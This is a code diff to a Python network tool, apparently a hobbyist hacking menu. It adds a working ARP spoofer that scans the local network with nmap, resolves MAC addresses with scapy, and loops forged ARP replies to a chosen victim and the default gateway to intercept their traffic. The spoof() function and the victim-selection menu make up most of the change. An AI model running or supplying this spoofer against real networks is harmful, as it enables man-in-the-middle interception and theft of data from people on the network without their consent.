@@ -38,6 +38,11 @@ def clearTerminal(): # Clear screen
         os.system("cls")
 
 
+# Returns the IPv4 of the default gateway
+def getDefaultGateway():
+    gateways = netifaces.gateways()
+    return gateways['default'][netifaces.AF_INET][0]
+
 # Get MAC address from IP
 def getMAC(ip, verbose = False, showPacket = False):
     # Find MAC Address of the specified IP by sending an ARP request to the broadcast MAC Address
@@ -57,10 +62,14 @@ def getMAC(ip, verbose = False, showPacket = False):
         fullPacket.show()
 
     # Get response from the request
-    res = scapy.srp(fullPacket, timeout = 2, verbose = verbose)[0]
+    try:
+        res = scapy.srp(fullPacket, timeout = 2, verbose = verbose)[0]
 
-    # Return MAC Address
-    return res[0][1].hwsrc
+        # Return MAC Address
+        return res[0][1].hwsrc
+
+    except:
+        print("Unable to get MAC Address for [{}]".format(ip))
 
 
 # Check if passed IP address is a valid IP address
@@ -139,6 +148,12 @@ def getNetworkIPs():
     result = nm.scan(IPAddr + subnetMask, arguments = '-sn')
     allHosts = nm.all_hosts()
 
+    # Remove the default gateway from the list
+    defaultGateway = getDefaultGateway()
+    if defaultGateway in allHosts:
+        allHosts.remove(defaultGateway)
+
+
     if len(allHosts) > 0:
         return allHosts
 
@@ -148,10 +163,35 @@ def getNetworkIPs():
         return
 
 
+# ARP Spoofer helper function (sends malicious ARP packet)
+def spoof(targetIP, targetMAC, gatewayIP, gatewayMAC):
+    try:
+        print("Spoofing [{}] (CTRL + C to stop)".format(targetIP))
+
+        while True:
+            # Create 2 packets. One will be sent to the default gateway, the other one to the target's machine
+            packet1 = scapy.ARP(op = 2, hwdst = gatewayMAC, pdst = gatewayIP, psrc = targetIP) # This packet will be sent to the default gateway
+            packet2 = scapy.ARP(op = 2, hwdst = targetMAC, pdst = targetIP, psrc = gatewayIP) # This packet will be sent to the target machine
+
+            # Send both packets
+            scapy.send(packet1, verbose = False)
+            scapy.send(packet2, verbose = False)
+
+            # Sleep for 2 seconds (Send an ARP response every 2 seconds)
+            time.sleep(2)
+            
+    except KeyboardInterrupt:
+        print("Keyboard interrupt detected. Exiting ARP Spoofer...")
+        time.sleep(2.5)
+
+
+# Checks if a host belongs to the same network as me
+def validateHost(IP):
+    pass
+
 
 def ARPSpoofer():
     asciiBanner = pyfiglet.figlet_format("ARP Spoofer")
-    
 
     options = ["Manual selection", "Find hosts", "Quit"]
     option, index = pick(options, asciiBanner, indicator = ">", default_index = 0)
@@ -159,7 +199,47 @@ def ARPSpoofer():
     clearTerminal()
     print(asciiBanner)
 
-    if index == 1:
+    if index == 0:
+        IP2Spoof = ""
+
+        # Get the IP to spoof
+        while True: 
+            clearTerminal()
+            print(asciiBanner)
+            IP2Spoof = input("Insert an IP to spoof: ")
+
+            if isValidIP(IP2Spoof)[0]: # The first return value [0] of isValidIP() is a True/False flag that indicates if a given IP is valid
+                break
+
+            print("'{}' Is not a valid IP address".format(IP2Spoof))
+            time.sleep(0.5)
+
+        # Get the gateway/router
+        defaultGateway = getDefaultGateway()
+        gw = ""
+
+        while True:
+            clearTerminal()
+            print(asciiBanner)
+            gw = input("Insert the gateway/router IP (default '{}'): ".format(defaultGateway))
+
+            if gw == "":
+                gw = defaultGateway
+                break
+
+            elif isValidIP(gw)[0]:
+                break
+
+            print("'{}' Is not a valid IP address".format(gw))
+            time.sleep(0.5)
+
+        print("Target IP: {}".format(IP2Spoof))
+        print("Gateway: {}".format(gw))
+        print("Validating hosts...")
+        time.sleep(4)
+
+
+    elif index == 1:
 
         print("Fetching the network... this may take a moment")
 
@@ -176,7 +256,20 @@ def ARPSpoofer():
             for i in range(0, len(allHosts)):
                 print("{} - {} ({})".format(i + 1, allHosts[i], socket.gethostbyaddr(allHosts[i])[0]))
 
-            IP2Spoof = input("Select an IP to spoof: ")
+            IP2Spoof = int(input("Select an IP to spoof: "))
+            targetIP = allHosts[IP2Spoof - 1]
+
+
+            # Get the MAC address of the specified IP address
+            MACTarget = getMAC(targetIP)
+
+            # Get MAC address of the default gateway
+            defaultGateway = getDefaultGateway()
+            dfGWMAC = getMAC(defaultGateway)
+
+            # Spoof
+            spoof(targetIP, MACTarget, defaultGateway, dfGWMAC)
+            
 
     elif index == 2:
         return
